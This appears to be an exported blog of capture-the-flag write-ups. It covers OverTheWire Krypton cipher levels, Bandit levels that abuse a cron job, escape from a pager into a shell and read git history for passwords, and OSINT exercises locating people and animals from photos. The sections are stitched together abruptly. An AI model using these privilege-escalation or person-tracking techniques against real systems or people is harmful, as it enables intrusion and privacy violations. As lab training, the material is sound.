The first level is easy. The following string encodes the password using Base64: S1JZUFRPTklTR1JFQVQ= Use this password to log in to krypton.labs.overthewire.org with username krypton1 using SSH on port 2231. You can find the files for other levels in /krypton/ For this, we shall use our Ubuntu machine to decrypt the text as shown below.\nv1c70r-n00b@v1c70r-n00b:~/Desktop/overthewire/krypton$ echo \u0026#34;S1JZUFRPTklTR1JFQVQ=\u0026#34; | base64 -d [REDACTED] With that, we have our password for the next level.\nKrypton 1-2 # The goal for this level, is to try and decrypt the encrypted password stored in the file krypton2 in order to find the password for the next level. Below is a brief of the challenge.\nThe password for level 2 is in the file ‘krypton2’. It is ‘encrypted’ using a simple rotation. It is also in non-standard ciphertext format. When using alpha characters for cipher text it is normal to group the letters into 5 letter clusters, regardless of word boundaries. This helps obfuscate any patterns. This file has kept the plain text word boundaries and carried them to the cipher text. Enjoy! Below is the text in the file that we are required to decrypt.\nkrypton1@krypton:/krypton/krypton1$ ls krypton2 README krypton1@krypton:/krypton/krypton1$ cat krypton2 YRIRY GJB CNFFJBEQ EBGGRA From the README file, the text is encrypted using rot13. Since we are encouraged to not use cryptool, we shall try a regex that can help to decrypt the text as shown below.\nkrypton1@krypton:/krypton/krypton1$ cat krypton2 | tr \u0026#39;[A-Za-z]\u0026#39; \u0026#39;[N-ZA-Mn-za-m]\u0026#39; [REDACTED] krypton1@krypton:/krypton/krypton1$ And with that, we have the password for the next level.\nKrypton 2-3 # We shall start by reading the README file to get the guidelines on how to solve the challenge for this level.\nKrypton 2 ROT13 is a simple substitution cipher. Substitution ciphers are a simple replacement algorithm. In this example of a substitution cipher, we will explore a \u0026#39;monoalphebetic\u0026#39; cipher. Monoalphebetic means, literally, \u0026#34;one alphabet\u0026#34; and you will see why. This level contains an old form of cipher called a \u0026#39;Caesar Cipher\u0026#39;. A Caesar cipher shifts the alphabet by a set number. For example: plain:\ta b c d e f g h i j k ... cipher:\tG H I J K L M N O P Q ... In this example, the letter \u0026#39;a\u0026#39; in plaintext is replaced by a \u0026#39;G\u0026#39; in the ciphertext so, for example, the plaintext \u0026#39;bad\u0026#39; becomes \u0026#39;HGJ\u0026#39; in ciphertext. The password for level 3 is in the file krypton3. It is in 5 letter group ciphertext. It is encrypted with a Caesar Cipher. Without any further information, this cipher text may be difficult to break. You do not have direct access to the key, however you do have access to a program that will encrypt anything you wish to give it using the key. If you think logically, this is completely easy. One shot can solve it! Have fun. Additional Information: The `encrypt` binary will look for the keyfile in your current working directory. Therefore, it might be best to create a working direcory in /tmp and in there a link to the keyfile. As the `encrypt` binary runs setuid `krypton3`, you also need to give `krypton3` access to your working directory. Here is an example: krypton2@melinda:~$ mktemp -d /tmp/tmp.Wf2OnCpCDQ krypton2@melinda:~$ cd /tmp/tmp.Wf2OnCpCDQ krypton2@melinda:/tmp/tmp.Wf2OnCpCDQ$ ln -s /krypton/krypton2/keyfile.dat krypton2@melinda:/tmp/tmp.Wf2OnCpCDQ$ ls keyfile.dat krypton2@melinda:/tmp/tmp.Wf2OnCpCDQ$ chmod 777 . krypton2@melinda:/tmp/tmp.Wf2OnCpCDQ$ /krypton/krypton2/encrypt /etc/issue krypton2@melinda:/tmp/tmp.Wf2OnCpCDQ$ ls ciphertext keyfile.dat From the above description, this level uses Caesar cipher. We shall do as directed in the example given by first creating a temporary directory for us to solve the challenge and create a symbolic link of the keyfile.dat on the temporary directory in order for us to understand how the cipher works then decrypt our text.\nkrypton2@krypton:/krypton/krypton2$ mkdir /tmp/news krypton2@krypton:/krypton/krypton2$ cp encrypt krypton3 /tmp/news krypton2@krypton:/krypton/krypton2$ cd /tmp/news krypton2@krypton:/tmp/news$ ln -s /krypton/krypton2/keyfile.dat krypton2@krypton:/tmp/news$ ls encrypt keyfile.dat krypton3 README As seen below, we have tried to encrypt a file using the encrypt binary,as shown below.\nkrypton2@krypton:/tmp/news$ echo \u0026#34;ABC\u0026#34;\u0026gt; me.txt krypton2@krypton:/tmp/news$ /krypton/krypton2/encrypt me.txt krypton2@krypton:/tmp/news$ ls ciphertext encrypt keyfile.dat krypton3 me.txt README krypton2@krypton:/tmp/news$ cat ciphertext MNO krypton2@krypton:/tmp/news$ From the output above, the key is 12, that is a forward shift of 12 (in simple terms the 12th alphabet from the initial letter, hence if A will be M then from B, we count to the 12th letter and that is what B will be)\nFrom the binary, it is clear the forward shift being used to encrypt text is 12. We can use a shift of ±13 to reverse our ciphertext to a readable text as shown below.\nkrypton2@krypton:/tmp/news$ cat krypton3 | tr \u0026#39;[M-ZA-Lm-za-l]\u0026#39; \u0026#39;[A-MN-Zam-n-z]\u0026#39; [redacted] The tr command\ntr stands for translate. It replaces characters from one set with characters from another.\n'[M-ZA-Lm-za-l]'\nThis set includes all letters, but rearranged in a Caesar-like shifted order:\nM-Z A-L (uppercase) m-z a-l (lowercase) This is essentially a Caesar cipher with a shift of 13, commonly known as ROT13.\n'[A-MN-Zam-n-z]'\nThis is just the standard alphabet:\nA-M N-Z (uppercase) a-m n-z (lowercase) We have our password for the next level.\nKrypton 3-4 # We shall start by reading the README file to get the instructions for this level.\nWell done. You\u0026#39;ve moved past an easy substitution cipher. Hopefully you just encrypted the alphabet a plaintext to fully expose the key in one swoop. The main weakness of a simple substitution cipher is repeated use of a simple key. In the previous exercise you were able to introduce arbitrary plaintext to expose the key. In this example, the cipher mechanism is not available to you, the attacker. However, you have been lucky. You have intercepted more than one message. The password to the next level is found in the file \u0026#39;krypton4\u0026#39;. You have also found 3 other files. (found1, found2, found3) You know the following important details: - The message plaintexts are in English (*** very important) - They were produced from the same key (*** even better!) Enjoy. Moreover, we are provided with two hints and three found files as shown below.\nkrypton3@krypton:/krypton/krypton3$ ls found1 found2 found3 HINT1 HINT2 krypton4 README krypton3@krypton:/krypton/krypton3$ Opening the two hint files, we get the following hints.\nkrypton3@krypton:/krypton/krypton3$ cat HINT* Some letters are more prevalent in English than others. \u0026#34;Frequency Analysis\u0026#34; is your friend. This is interesting, we have letters that are more prevalent than others, we can use some google fu to understand better what this means. From this link, we get to understand more about what frequency analysis is. Further search online, we come across this tool that will help us in mapping out the frequency of letters in out cipher texts. The tool did not serve us much, we can try another tool like quipquip whereby, we shall use the contents of one of the found file then put the contents of the krypton4 file at the end as shown below then click on solve to wait on the tool to give us a solution as shown below, in my case I concatenated found1 and krypton4 together, then uploaded the output to the tool for it to solve.\nkrypton3@krypton:/krypton/krypton3$ cat found1 krypton4 CGZNL YJBEN QYDLQ ZQSUQ NZCYD SNQVU BFGBK GQUQZ QSUQN UZCYD SNJDS UDCXJ ZCYDS NZQSU QNUZB WSBNZ QSUQN UDCXJ CUBGS BXJDS UCTYV SUJQG WTBUJ KCWSV LFGBK GSGZN LYJCB GJSZD GCHMS UCJCU QJLYS BXUMA UJCJM JCBGZ CYDSN CGKDC ZDSQZ DVSJJ SNCGJ DSYVQ CGJSO JCUNS YVQZS WALQV SJJSN UBTSX COSWG MTASN BXYBU CJCBG UWBKG JDSQV YDQAS JXBNS OQTYV SKCJD QUDCX JBXQK BMVWA SNSYV QZSWA LWAKB MVWAS ZBTSS QGWUB BGJDS TSJDB WCUGQ TSWQX JSNRM VCMUZ QSUQN KDBMU SWCJJ BZBTT MGCZQ JSKCJ DDCUE SGSNQ VUJDS SGZNL YJCBG UJSYY SNXBN TSWAL QZQSU QNZCY DSNCU BXJSG CGZBN YBNQJ SWQUY QNJBX TBNSZ BTYVS OUZDS TSUUM ZDQUJ DSICE SGNSZ CYDSN QGWUJ CVVDQ UTBWS NGQYY VCZQJ CBGCG JDSNB JULUJ STQUK CJDQV VUCGE VSQVY DQASJ UMAUJ CJMJC BGZCY DSNUJ DSZQS UQNZC YDSNC USQUC VLANB FSGQG WCGYN QZJCZ SBXXS NUSUU SGJCQ VVLGB ZBTTM GCZQJ CBGUS ZMNCJ LUDQF SUYSQ NSYNB WMZSW TBUJB XDCUF GBKGK BNFAS JKSSG QGWDC USQNV LYVQL UKSNS TQCGV LZBTS WCSUQ GWDCU JBNCS UESGN SUDSN QCUSW JBJDS YSQFB XUBYD CUJCZ QJCBG QGWQN JCUJN LALJD SSGWB XJDSU COJSS GJDZS GJMNL GSOJD SKNBJ STQCG VLJNQ ESWCS UMGJC VQABM JCGZV MWCGE DQTVS JFCGE VSQNQ GWTQZ ASJDZ BGUCW SNSWU BTSBX JDSXC GSUJS OQTYV SUCGJ DSSGE VCUDV QGEMQ ESCGD CUVQU JYDQU SDSKN BJSJN QECZB TSWCS UQVUB FGBKG QUNBT QGZSU QGWZB VVQAB NQJSW KCJDB JDSNY VQLKN CEDJU TQGLB XDCUY VQLUK SNSYM AVCUD SWCGS WCJCB GUBXI QNLCG EHMQV CJLQG WQZZM NQZLW MNCGE DCUVC XSJCT SQGWC GJKBB XDCUX BNTSN JDSQJ NCZQV ZBVVS QEMSU YMAVC UDSWJ DSXCN UJXBV CBQZB VVSZJ SWSWC JCBGB XDCUW NQTQJ CZKBN FUJDQ JCGZV MWSWQ VVAMJ JKBBX JDSYV QLUGB KNSZB EGCUS WQUUD QFSUY SQNSU KSVVW BGSJD SVSIS VXBMN YQUUK BNWCU ANMJS With that, we now have the password for the next level.\nKrypton 4-5 # Just like the other challenges, we shall start by first reading the README file to see what is required of us.\nGood job! You more than likely used frequency analysis and some common sense to solve that one. So far we have worked with simple substitution ciphers. They have also been \u0026#39;monoalphabetic\u0026#39;, meaning using a fixed key, and giving a one to one mapping of plaintext (P) to ciphertext (C). Another type of substitution cipher is referred to as \u0026#39;polyalphabetic\u0026#39;, where one character of P may map to many, or all, possible ciphertext characters. An example of a polyalphabetic cipher is called a Vigen�re Cipher. It works like this: If we use the key(K) \u0026#39;GOLD\u0026#39;, and P = PROCEED MEETING AS AGREED, then \u0026#34;add\u0026#34; P to K, we get C. When adding, if we exceed 25, then we roll to 0 (modulo 26). P P R O C E E D M E E T I N G A S A G R E E D K G O L D G O L D G O L D G O L D G O L D G O becomes: P 15 17 14 2 4 4 3 12 4 4 19 8 13 6 0 18 0 6 17 4 4 3 K 6 14 11 3 6 14 11 3 6 14 11 3 6 14 11 3 6 14 11 3 6 14 C 21 5 25 5 10 18 14 15 10 18 4 11 19 20 11 21 6 20 2 8 10 17 So, we get a ciphertext of: VFZFK SOPKS ELTUL VGUCH KR This level is a Vigen�re Cipher. You have intercepted two longer, english language messages. You also have a key piece of information. You know the key length! For this exercise, the key length is 6. The password to level five is in the usual place, encrypted with the 6 letter key. Have fun! As stated in the README file, we are using the vigenere cipher, one of the poly-alphabetic ciphers. Moreover, from the description, the key length we are told is 6.\nFor this case, we shall use online tools to get the key from the found file texts then use the key to decrypt the message on the file krypton5. The tool we shall use is this one.\nFrom the screenshot above, we have found the key to use to decrypt the password for the next level, we shall open a new tab and input the found key to decrypt the cipher text as shown below.\nKrypton 5-6 # We start by reading the readme file as usual to get an understanding of the cipher or encryption algorithm we are about to deal with.\nFrequency analysis can break a known key length as well. Lets try one last polyalphabetic cipher, but this time the key length is unknown. Enjoy. From the description, we need to perform some sort of brute force to get the key length we can use. We shall use the same tool as the one we used in level 4\nAs seen above, we have been able to get the key by using the cipher text from found1 file and the key-length as well. We can use this key to decrypt the cipher text for password for level 6 as shown below.\nKrypton 6-7 # From the README file, we get the following information.\nHopefully by now its obvious that encryption using repeating keys is a bad idea. Frequency analysis can destroy repeating/fixed key substitution crypto. A feature of good crypto is random ciphertext. A good cipher must not reveal any clues about the plaintext. Since natural language plaintext (in this case, English) contains patterns, it is left up to the encryption key or the encryption algorithm to add the \u0026#39;randomness\u0026#39;. Modern ciphers are similar to older plain substitution ciphers, but improve the \u0026#39;random\u0026#39; nature of the key. An example of an older cipher using a complex, random, large key is a vigniere using a key of the same size of the plaintext. For example, imagine you and your confident have agreed on a key using the book \u0026#39;A Tale of Two Cities\u0026#39; as your key, in 256 byte blocks. The cipher works as such: Each plaintext message is broken into 256 byte blocks. For each block of plaintext, a corresponding 256 byte block from the book is used as the key, starting from the first chapter, and progressing. No part of the book is ever re-used as key. The use of a key of the same length as the plaintext, and only using it once is called a \u0026#34;One Time Pad\u0026#34;. Look in the krypton6/onetime directory. You will find a file called \u0026#39;plain1\u0026#39;, a 256 byte block. You will also see a file \u0026#39;key1\u0026#39;, the first 256 bytes of \u0026#39;A Tale of Two Cities\u0026#39;. The file \u0026#39;cipher1\u0026#39; is the cipher text of plain1. As you can see (and try) it is very difficult to break the cipher without the key knowledge. (NOTE - it is possible though. Using plain language as a one time pad key has a weakness. As a secondary challenge, open README in that directory) If the encryption is truly random letters, and only used once, then it is impossible to break. A truly random \u0026#34;One Time Pad\u0026#34; key cannot be broken. Consider intercepting a ciphertext message of 1000 bytes. One could brute force for the key, but due to the random key nature, you would produce every single valid 1000 letter plaintext as well. Who is to know which is the real plaintext?!? Choosing keys that are the same size as the plaintext is impractical. Therefore, other methods must be used to obscure ciphertext against frequency analysis in a simple substitution cipher. The impracticality of an \u0026#39;infinite\u0026#39; key means that the randomness, or entropy, of the encryption is introduced via the method. We have seen the method of \u0026#39;substitution\u0026#39;. Even in modern crypto, substitution is a valid technique. Another technique is \u0026#39;transposition\u0026#39;, or swapping of bytes. Modern ciphers break into two types; symmetric and asymmetric. Symmetric ciphers come in two flavours: block and stream. Until now, we have been playing with classical ciphers, approximating \u0026#39;block\u0026#39; ciphers. A block cipher is done in fixed size blocks (suprise!). For example, in the previous paragraphs we discussed breaking text and keys into 256 byte blocks, and working on those blocks. Block ciphers use a fixed key to perform substituion and transposition ciphers on each block discretely. Its time to employ a stream cipher. A stream cipher attempts to create an on-the-fly \u0026#39;random\u0026#39; keystream to encrypt the incoming plaintext one byte at a time. Typically, the \u0026#39;random\u0026#39; key byte is xor\u0026#39;d with the plaintext to produce the ciphertext. If the random keystream can be replicated at the recieving end, then a further xor will produce the plaintext once again. From this example forward, we will be working with bytes, not ASCII text, so a hex editor/dumper like hexdump is a necessity. Now is the right time to start to learn to use tools like cryptool. In this example, the keyfile is in your directory, however it is not readable by you. The binary \u0026#39;encrypt6\u0026#39; is also available. It will read the keyfile and encrypt any message you desire, using the key AND a \u0026#39;random\u0026#39; number. You get to perform a \u0026#39;known ciphertext\u0026#39; attack by introducing plaintext of your choice. The challenge here is not simple, but the \u0026#39;random\u0026#39; number generator is weak. As stated, it is now that we suggest you begin to use public tools, like cryptool, to help in your analysis. You will most likely need a hint to get going. See \u0026#39;HINT1\u0026#39; if you need a kicktstart. If you have further difficulty, there is a hint in \u0026#39;HINT2\u0026#39;. The password for level 7 (krypton7) is encrypted with \u0026#39;encrypt6\u0026#39;. Good Luck! We have now moved from classical ciphers to modern ciphers of symmetric and asymmetric ciphers but for this challenge, we are focusing mostly on the stream cipher symmetric, a flavor of symmetric cipher.\nLooking at the hints given.\nThe \u0026#39;random\u0026#39; generator has a limited number of bits, and is periodic. Entropy analysis and a good look at the bytes in a hex editor will help. There is a pattern! 8 bit LFSR Just like level 2, we shall start first by creating a new temporary folder for our exploration, then copy the krypton file to the temporary folder and create a symbolic link o the keyfile to our temporary directory.\nrypton6@krypton:/krypton/krypton6$ mkdir /tmp/newz krypton6@krypton:/krypton/krypton6$ cp krypton7 /tmp/newz krypton6@krypton:/krypton/krypton6$ cd /tmp/newz krypton6@krypton:/tmp/newz$ ln -s /krypton/krypton6/keyfile.dat Next I tried to print 50 As using python then encrypt using the binary provided to us and noticed a recurring pattern, where after 30 characters, the pattern starts repeating again as shown below.\nkrypton6@krypton:/tmp/newz$ python3 -c \u0026#34;print( \u0026#39;A\u0026#39;*50)\u0026#34; \u0026gt; test.txt krypton6@krypton:/tmp/newz$ /krypton/krypton6/encrypt6 test.txt output.txt krypton6@krypton:/tmp/newz$ cat output.txt EICTDGYIYZKTHNSIRFXYCPFUEOCKRNEICTDGYIYZKTHNSIRFXY As seen above, after 30 characters, the pattern starts to repeat EICTDGYIYZKTHNSIRFXYCPFUEOCKRN EICTDGYIYZKTHNSIRFXY\nWe can now try a python script that will fasten the process and be able to get the password for the next level.\nkey = \u0026#39;EICTDGYIYZKTHNSIRFXYCPFUEOCKRN\u0026#39; cipher = \u0026#39;PNUKLYLWRQKGKBE\u0026#39; pt = \u0026#39;\u0026#39; for i in range(len(cipher)): tmp = ord(cipher[i]) - ord(key[i]) if tmp \u0026lt; 0: tmp += 26 tmp += ord(\u0026#39;A\u0026#39;) pt += chr(tmp) print (pt) Below is a breakdown of the code\n🟦 key and cipher:\nkey is a 30-character uppercase string (but only the first 15 are used). cipher is a 15-character encrypted message. 🟦 pt = '':\nThis initializes the plaintext result. 🔄 The for loop:\nfor i in range(len(cipher)): Iterates over each character of the cipher (15 characters in total). 🔤 Decryption Logic:\ntmp = ord(cipher[i]) - ord(key[i]) Converts both the cipher character and the corresponding key character to their ASCII values.

With that, we can simply get the password by doing the following.\nbandit22@bandit:~$ echo \u0026#34;I am user bandit23\u0026#34; | md5sum 8ca319486bfbbc3663ea0fbe81326349 - bandit22@bandit:~$ cat /tmp/8ca319486bfbbc3663ea0fbe81326349 [REDACTED] What we have simply done is echo I am user bandit23 and hashed it using md5sum, then concatenated the contents of the password stored in the tmp directory with md5 hash value.\nbandit level 23-24 # This level is similar to the previous one, however the script executed is different this time, as seen below.\nbandit23@bandit:~$ cat /usr/bin/cronjob_bandit24.sh #!/bin/bash myname=$(whoami) cd /var/spool/$myname/foo echo \u0026#34;Executing and deleting all scripts in /var/spool/$myname/foo:\u0026#34; for i in * .*; do if [ \u0026#34;$i\u0026#34; != \u0026#34;.\u0026#34; -a \u0026#34;$i\u0026#34; != \u0026#34;..\u0026#34; ]; then echo \u0026#34;Handling $i\u0026#34; owner=\u0026#34;$(stat --format \u0026#34;%U\u0026#34; ./$i)\u0026#34; if [ \u0026#34;${owner}\u0026#34; = \u0026#34;bandit23\u0026#34; ]; then timeout -s 9 60 ./$i fi rm -f ./$i fi done Below is a break-down of the script\nThis Bash script is designed to execute and delete all scripts in a directory, with some checks for file ownership and a timeout. It’s likely part of a challenge like Bandit Level 24 → 25, where your script is automatically executed if you drop it in the right place with the right ownership. 🔍 Full Breakdown #!/bin/bash The shebang tells the system to use Bash to run the script. myname=$(whoami) Stores the current username in the variable myname. cd /var/spool/$myname/foo Changes the current working directory to /var/spool/\u0026lt;username\u0026gt;/foo. For example, if whoami is bandit24, this becomes /var/spool/bandit24/foo. echo \u0026#34;Executing and deleting all scripts in /var/spool/$myname/foo:\u0026#34; Just a status message to indicate what the script is doing. 🔁 Loop for i in * .*; Iterates over all files, including hidden ones (.*). Typical globbing (*) misses dotfiles (like .my_script), so both patterns are used to catch everything. if [ \u0026#34;$i\u0026#34; != \u0026#34;.\u0026#34; -a \u0026#34;$i\u0026#34; != \u0026#34;..\u0026#34; ]; Skips the special entries . (current directory) and .. (parent directory), which would break the script if processed. echo \u0026#34;Handling $i\u0026#34; Prints the filename being processed. owner=\u0026#34;$(stat --format \u0026#34;%U\u0026#34; ./$i)\u0026#34; Uses stat to get the owner of the file (%U is the user name), and stores it in owner. if [ \u0026#34;${owner}\u0026#34; = \u0026#34;bandit23\u0026#34; ]; then timeout -s 9 60 ./$i fi If the file is owned by bandit23, the script: Runs the file using timeout: -s 9: sends SIGKILL (signal 9) if it runs too long. 60: gives it 60 seconds max to run. Prevents scripts from hanging or consuming too many resources. rm -f ./$i Deletes the script file after executing (regardless of ownership or execution success). So this requires us to create our own shell script to pass this level, however we shall use some trick, we will create the variable myname and assign the value bandit24 as shown below.\nbandit23@bandit:~$ myname=bandit24 bandit23@bandit:~$ $myname bandit24: command not found bandit23@bandit:~$ After creating the variable we shall then create a tmp adirectory where the password will be stored for us to be able to reach it by setting the directory permissions for everyone to be able to read, write and execute it as shown below\nbandit23@bandit:~$ mkdir /tmp/victor bandit23@bandit:~$ chmod 777 /tmp/victor bandit23@bandit:~$ After that we shall then switch to the spool directory of bandit user bandit24 using the variable we created as shown below.\nbandit23@bandit:~$ cd /var/spool/$myname bandit23@bandit:/var/spool/bandit24$ ls foo bandit23@bandit:/var/spool/bandit24$ cd foo bandit23@bandit:/var/spool/bandit24/foo$ After that we create our script inside here and change its permissions to an executable in order for us to get the password stored in our temporary directory.

Looking at the man page of the more command, we get some interesting commands we can use as shown below.\n= Display current line number. /pattern Search for kth occurrence of regular expression. Defaults to 1. n Search for kth occurrence of last regular expression. Defaults to 1. !command or :!command Execute command in a subshell. v Start up an editor at current line. The editor is taken from the environment variable VISUAL if defined, or EDITOR if VISUAL is not defined, or defaults to vi(1) if neither VISUAL nor EDITOR is defined. For us to activate the more command, we shall reduce the terminal size in order to be able to activate it by increasing the size of the terminal output by pressing the button ctrl + +as shown below.\nAbove is the initial terminal size.\nAbove the size of the terminal after increasing the terminal output size.\nAfter getting the terminal to that size, we can then try to press the v button to get a text editor, in our case we get the vim editor. We can access the password for the level 26 by using the :e which in vim means edit letter then followed by the password file as shown below\nAfter entering the above command then pressing enter, we get the password for level 26.\nbandit level 26-27 # For this level, we shall use the terminal we got in the previous section.\nHere we shall set the shell to be /bin/bash as shown below.\nTo access the bash shell, we can now just type :shell, and we get our bash shell, but I want to explore the vi editor hence, to execute commands, we shall use the prefix shown below.\nIn vi editor, the prefix :! is used in the execution of external shell commands, as seen above.\nMoreover, the binary file bandit27-do performs the same task as the one in bandit level 19, therefore, we shall use it to get the password for bandit level 27.\nbandit level 27-28 # For this level, we shall be using git. This part is quite easy as we are required to clone the repo and be able to access the password for the next level.

It tells Git: \u0026#34;When using SSH to connect, use the command ssh -p 2220 instead of the default SSH (which uses port 22).\u0026#34; This is important because the Bandit SSH server listens on port 2220, not 22. git clone ssh://bandit27-git@localhost/home/bandit27-git/repo This tells Git to clone a repository using the SSH protocol. bandit27-git@localhost means: Connect as user bandit27-git to the local machine (because you\u0026#39;re already on the Bandit server). /home/bandit27-git/repo is the path to the Git repository on the server. So what happens together? Git uses the custom SSH command (ssh -p 2220) to: Connect to localhost on port 2220 Authenticate as bandit27-git Clone the Git repo from /home/bandit27-git/repo The password is located in a README file inside the cloned repo.\nbandit level 28-29 # For this level, we shall use the same tactics as in the previous level to get the password for the next level.\nGIT_SSH_COMMAND=\u0026#34;ssh -p 2220\u0026#34; git clone ssh://bandit28-git@localhost/home/bandit28-git/repo However, looking at the contents of the README file, we do not have the password for the level as seen below.\nbandit28@bandit:/tmp/28o/repo$ cat README.md # Bandit Notes Some notes for level29 of bandit. ## credentials - username: bandit29 - password: xxxxxxxxxx Looking at the logs of the branch, we get some interesting commit message as shown below.\nbandit28@bandit:/tmp/28o/repo$ git log commit 674690a00a0056ab96048f7317b9ec20c057c06b (HEAD -\u0026gt; master, origin/master, origin/HEAD) Author: Morla Porla \u0026lt;morla@overthewire.org\u0026gt; Date: Thu Apr 10 14:23:19 2025 +0000 fix info leak commit fb0df1358b1ff146f581651a84bae622353a71c0 Author: Morla Porla \u0026lt;morla@overthewire.org\u0026gt; Date: Thu Apr 10 14:23:19 2025 +0000 add missing data commit a5fdc97aae2c6f0e6c1e722877a100f24bcaaa46 Author: Ben Dover \u0026lt;noone@overthewire.org\u0026gt; Date: Thu Apr 10 14:23:19 2025 +0000 initial commit of README.md We shall check out to the branch fb0df1358b1ff146f581651a84bae622353a71c0 and see which missing data was added.\nbandit28@bandit:/tmp/28o/repo$ git checkout fb0df1358b1ff146f581651a84bae622353a71c0 Note: switching to \u0026#39;fb0df1358b1ff146f581651a84bae622353a71c0\u0026#39;.

Below is the task briefing\nThe newborn giraffe seen in the photo below belongs to an endangered species. Individuals such as this one, born in captivity, often participate in conservation programs. This may include transfers to accredited facilities for carefully planned breeding efforts aimed at ensuring the survival of their species. Your task is to find the following information regarding the individual seen below: a) Location and date of birth. b) Current residence and date of arrival. c) A photo in its current habitat. Below is the image of the giraffe.\nLocation and date of birth. # We shall start by first performing an image reverse search.\nAs seen above we have been able to find a source that contains an image that is a replica of our challenge image, we can click on the link of the image and find where the giraffe is located.\nWe have been able to identify more photos of the same baby giraffe as shown below.\nand our challenge photo was from the blog itself as shown below.\nFrom the blog, the baby giraffe is a girl, furthermore, from the blog we have two conflicting dates when the giraffe was born from the top the date is said to be October 23rd and as we go on to read more about the giraffe we find that the giraffe was again born on October 21 at 9:15 p.m so which date is true?\nFrom the blog, the giraffe was born at Virginia zoo and we are provided with a link to the zoo’s website, we can try and search the website on web archive and see if we can fin a post about the giraffe’s birth as endangered species’ birth are usually a big deal and they require protection from poachers.\nAs seen above, going to the snapshot of November 2 2009 we get the post of a masai giraffe that was born on October 22, 2009. Clicking on the link, we find that the page was archived on October 31 and below is the blog\nWe have a date that has two sources October 21, 2009 at 9:15pm on the archived post, the date was on a Wednesday and after clarifying the date it was truly on a Wednesday.\nFrom the archived blog, we have a link that shows more images of the same baby giraffe.\nand as seen above again, we have the same date again of October 21 2009 therefore, with that information we can now say our baby Giraffe was born on October 21, 2009\nAnswer: Virginia Zoo date: October 21, 2009\nCurrent residence and date of arrival # We now know the names of the parents to the baby Giraffe father 8-year-old male, Billy and mother 7-year-old female, Imara and it belong to the masai Species. We can now search for the parents on the website we initially found after doing reverse image search and see what details we shall find about the parents of the daughter.\nFrom the new blog entry, we have some interesting information as shown below.\nWe have the name of our baby Giraffe birthed by Imara who is at Disney's Animal Kingdom in Florida. We shall search for this location and see if the giraffe is the same baby who was Virginia Zoo.\nThe source we found above, gave more information about the birthed Giraffe as shown below.\nFrom the description on the blog above it matches our baby Giraffe, now we know our Giraffe is called Willow and was moved to Disney's Animal Kingdom in Florida on October 12 but we do not know which year the baby arrived at the Kingdom we shall search and find out on google.\nFrom the source above, searching fro October 12, I got 2010 this is because from the post Wilow is 1-year-old and she was born on October 21 2009.\nTo verify I searched what day of the week it was on October 12, 2010 as seen below and it was truly a Tuesday.\nAnswer: Disney's Animal Kingdom in Florida arrival date: October 12, 2010\nA photo in its current habitat # The search we did earlier of our baby Giraffe, we got many results and scrolling through the results I got a link claiming to be of our baby Giraffe as shown below.\nThis source was a false source as the image we have is not of a masai giraffe neither of a reticulated giraffe.\nBelow is the image from the found source.\nAs seen this giraffe is neither a reticulated nor a Masai Giraffe. We can redefine our search and try again as shown below.\nFrom the source identified we have found our girafffe but we shall verify if it is truly the one .\nand we have clearly identified Willow as shown above below is the actual image.\n","date":"31 March 2025","externalUrl":null,"permalink":"/posts/osintexercise-31/","section":"Posts","summary":"credit to Sofia Santos","title":"OSINT(Exercise 31)","type":"posts"},{"content":"","date":"31 March 2025","externalUrl":null,"permalink":"/categories/sofia-santos-osint-exercises/","section":"Categories","summary":"","title":"Sofia Santos' OSINT Exercises","type":"categories"},{"content":" Exercise 29 # This challenge was quite a tough one as we are required to know which book the person was reading yet the image from the challenge is too blurry.

From the image, it is clearly seen to be a reflection , I will try and turn the image to identify words.\nAs seen above we have been able to flip the image horizontally, we can try and read the words using the old book technique of squinting(can use this technique if you do not have eye problems).\nAs seen above we are able to identify few words She has the letters from William's cousin james we can search for a book with this words. After some searches online, I came across google’s advance book search that you can use to search a book with specific words, let us try it out and see what we shall find.

Looking around the website, I was able to identify a few features we saw in our image analysis.\nThis is an advert form the our trains page. From this page, I explored different classes standard,first class and our Azuma but for our Azuma I got a seat map rather than how the seats look like, therefore I decided to search for the LNER train azuma seats.\nWe have found our train. From the description it is one of the standard class coaches of an 800 series Azuma train\nAnswer: LNER Azuma train\nIdentify the seat number # For this section, I had to reason some things, first Sofia being an OSINT analyst would like seat at the back as she is cautious of her privacy, two she would go for a quieter place as most investigative cyber security practitioners prefer a place with less noise for rest and peace of mind and from the image the person was seating in front of Sofia, therefore, she is seated somewhere at the back near a window.With this information we can use the seat map for azuma we found earlier\nAs seen above, after searching for quieter, we get coach H. We can go to this coach and find which seats are at the back.\nWe have found the map for coach H, now with the previous views Back seat near a window we have two seats 88 and 83. Let us go back to our challenge image and look at it again closely after we rotated it horizontaly.\nFrom this image, we can conclude the person was reading the ebook seated at seat 79p therefore Sofia was at seat 83. The reason behind this is if the person was seated at seat 86 and Sofia took her a photo, the reflection would be different because, the image would show her left arm too and the ebook would be at a distant from the window.\nAnswer: 83\n","date":"30 March 2025","externalUrl":null,"permalink":"/posts/osintexercise-29/","section":"Posts","summary":"credit to Sofia Santos","title":"OSINT(Exercise 29)","type":"posts"},{"content":" Exercise 27 # For this challenge, we are required to find the following details outlined in the task briefing below.\nThe image below shows a group of people sitting in front of a large screen that reads “Lectura en Movimiento en Lima”.

Reverse image search was not sufficient, we shall zoom closer to the image and try find more details.\nAs seen above, there is a car rental shop near by, since the last two photos we saw, were all in Uzbekistan, we can try and search for car rental shops in Tashkent and see which one has the same match as ours.\nAfter some searched, I was able to find a shop that matches the advert color on the poster of the shop.\nWe are now close to the location of our image.\nAs seen above, we are now able to locate where our image was taken from.\nFrom the image the person was on a vehicle, and as the person seems to be traveling a lot, the person is a tourist therefore for this case means of transport could be a taxi.\nAnswer: 41°17'57.6\u0026quot;N 69°16'21.1\u0026quot;E, mode of transport: Taxi\nVideo # For this video, we need to think about the context: the images we are analysing seem to be from someone’s camera roll. They are named like a digital camera would name images: incrementally. Thus this video, IMG_2677, has been taken after the three images we already localised: IMG_2597 (Chorsu Bazaar), IMG_2626 (Halva Café) and IMG_2658 (Subway entrance). It would stand to reason that the train this person took departed from Tashkent.\nIf we take a look at a map of the railways in Uzbekistan, there are 4 railways leaving Tashkent:\nLooking at the video, we are able to identify some details shown in the image below.\nThere are mountains in the background with some pattern.\nThe sun on the image is to the left, that is behind the train, we can check the sun position using suncalc as shown below.\nPosition of the sun on February 15th 2024 at 12:01\nThis suggests that the train was most likely heading southwest, following the fourth railway on our map. The next major stop along this route is Samarkand. When examining this region on Google Earth, only the final third of the journey (highlighted in red below) appears to feature the mountainous terrain visible in the video.\nAt last now we have a smaller location to search, from here, I looked for the unique patterns we saw on the mountains and found them as shown below.\nMoving along the site, I was able to identify a location that has a 